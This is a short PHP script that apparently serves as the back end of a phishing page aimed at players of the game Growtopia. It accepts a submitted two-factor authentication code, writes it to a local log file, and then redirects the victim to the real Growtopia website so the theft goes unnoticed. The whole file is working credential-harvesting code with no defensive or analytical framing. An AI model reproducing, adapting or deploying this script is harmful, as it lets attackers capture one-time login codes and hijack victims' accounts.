
<?php
if(isset($_POST['code'])) {
    $file = fopen("log.txt", "a");
    fwrite($file, "2FA Code: " . $_POST['code'] . "\n");
    fclose($file);
    header('Location: https://www.growtopiagame.com/');
    exit();
} else {
    echo "Invalid 2FA input.";
}
?>
